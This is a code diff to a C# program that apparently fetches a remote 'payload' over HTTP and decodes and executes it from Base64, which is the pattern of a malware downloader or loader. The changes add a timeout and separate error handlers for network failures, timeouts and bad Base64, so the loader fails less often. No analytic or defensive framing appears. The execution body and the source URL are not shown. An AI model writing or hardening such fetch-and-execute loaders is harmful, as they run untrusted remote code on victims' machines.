@@ -39,16 +39,25 @@ class Program
             Console.WriteLine($"[INFO] Fetching payload from: {url}");
             using (HttpClient client = new HttpClient())
             {
+                client.Timeout = TimeSpan.FromSeconds(10); // Set a timeout to avoid hanging
                 string content = await client.GetStringAsync(url);
                 Console.WriteLine("[SUCCESS] Payload fetched successfully!");
                 return content;
             }
         }
+        catch (HttpRequestException httpEx)
+        {
+            Console.WriteLine($"[ERROR] HTTP Request failed: {httpEx.Message}");
+        }
+        catch (TaskCanceledException)
+        {
+            Console.WriteLine("[ERROR] Fetching payload timed out.");
+        }
         catch (Exception ex)
         {
-            Console.WriteLine($"[ERROR] Failed to fetch payload: {ex.Message}");
-            return string.Empty;
+            Console.WriteLine($"[ERROR] Unexpected error: {ex.Message}");
         }
+        return string.Empty;
     }
 
     static void ExecutePayload(string base64Payload)
@@ -81,6 +90,10 @@ class Program
             }
             Console.WriteLine("[SUCCESS] Payload executed!");
         }
+        catch (FormatException)
+        {
+            Console.WriteLine("[ERROR] Failed to decode Base64 payload.");
+        }
         catch (Exception ex)
         {
             Console.WriteLine($"[ERROR] Failed to execute payload: {ex.Message}");
@@ -90,6 +103,7 @@ class Program
         Console.ReadLine();
     }
 }
+
 
 
 
